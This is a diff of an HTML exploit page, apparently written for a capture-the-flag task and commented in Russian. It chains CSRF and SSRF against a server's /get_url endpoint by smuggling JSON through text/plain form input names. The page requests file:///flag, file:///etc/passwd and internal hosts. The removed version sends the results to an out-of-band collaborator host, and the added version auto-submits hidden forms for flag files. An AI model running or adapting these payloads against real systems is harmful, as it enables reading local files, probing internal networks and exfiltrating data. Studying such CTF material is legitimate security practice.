@@ -1,51 +1,34 @@
 <!DOCTYPE html>
-<iframe name="ssrfResult" style="display:none"></iframe>
+<form method="POST" action="https://tasks.goidactf.ru:20185/get_url" 
+      enctype="text/plain" target="_blank">
+    <input name='{"url":"file:///flag","test":"' value='test"}' type="hidden">
+</form>
+
+<form method="POST" action="https://tasks.goidactf.ru:20185/get_url" 
+      enctype="text/plain" target="_blank">
+    <input name='{"url":"file:///app/flag.txt","test":"' value='test"}' type="hidden">
+</form>
+
+<form method="POST" action="https://tasks.goidactf.ru:20185/get_url" 
+      enctype="text/plain" target="_blank">
+    <input name='{"url":"file:///home/flag","test":"' value='test"}' type="hidden">
+</form>
 
 <script>
-const TARGET = 'https://tasks.goidactf.ru:20185';
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+// Отправляем все формы
+setTimeout(() => document.forms[0].submit(), 500);
+setTimeout(() => document.forms[1].submit(), 2000);
+setTimeout(() => document.forms[2].submit(), 3500);
 
-// URLs для тестирования
-const testURLs = [
-    'file:///flag',
-    'file:///etc/passwd',
-    'http://d39b126c-4ef5-4750-8740-2efb6b0b0166.local/admin',
-    'http://8447d341-c19f-4e29-8561-e345a5cf6c26.local/flag',
-    'http://localhost/flag',
-    'http://127.0.0.1:80/flag'
-];
-
-testURLs.forEach((url, index) => {
-    setTimeout(() => {
-        // Создаём форму которая отправит запрос
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = TARGET + '/get_url';
-        form.target = 'ssrfResult';
-        form.enctype = 'text/plain';
-        
-        // Создаём правильный JSON
-        const input = document.createElement('input');
-        input.name = `{"url":"${url}","test":"`;
-        input.value = 'test"}';
-        
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
-        
-        // Через 3 секунды читаем window.name iframe
-        setTimeout(() => {
-            try {
-                const result = window.frames['ssrfResult'].name;
-                if (result && result.length > 0) {
-                    // Отправляем результат
-                    new Image().src = COLLAB + '/?ssrf_data_' + index + '=' + 
-                                     encodeURIComponent(result.substring(0, 500));
-                }
-            } catch(e) {
-                // CORS блокирует - это нормально
-            }
-        }, 3000);
-    }, index * 5000); // 5 секунд между запросами
-});
+// И пробуем внутренние хосты тоже
+setTimeout(() => {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://tasks.goidactf.ru:20185/get_url';
+    form.enctype = 'text/plain';
+    form.target = '_blank';
+    form.innerHTML = '<input name=\'{"url":"http://d39b126c-4ef5-4750-8740-2efb6b0b0166.local/flag","test":"\' value=\'test"}\' type="hidden">';
+    document.body.appendChild(form);
+    form.submit();
+}, 5000);
 </script>
